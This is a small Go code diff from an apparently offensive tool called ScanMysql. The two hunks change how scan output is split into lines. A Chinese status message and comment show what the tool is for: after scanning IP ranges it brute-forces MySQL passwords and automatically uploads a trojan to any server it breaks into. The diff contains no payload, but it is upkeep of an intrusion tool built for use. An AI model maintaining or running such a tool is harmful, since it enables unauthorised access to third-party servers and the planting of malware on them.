@@ -89,7 +89,7 @@ func ( *ScanMysql) ipformat()[]string {
 		fmt.Println(err)
 	}
 	str := string(res)
-	arr := strings.Split(str,"\r\n")
+	arr := strings.Split(str,"\n")
 	l := len(arr)-4
 	arrs := arr[2:l]
 	var newarr []string
@@ -134,7 +134,7 @@ func main() {
 		fmt.Println(err)
 	}
 	str := string(res)
-	obj.dist = strings.Split(str,"\r\n")
+	obj.dist = strings.Split(str,"\n")
 	fmt.Printf("\r\nIP段扫描完毕，程序即将开始爆破密码...\r\n")
 	time.Sleep(1 * time.Second)
 	//启动线程开始爆破,爆破成功则自动上传木马
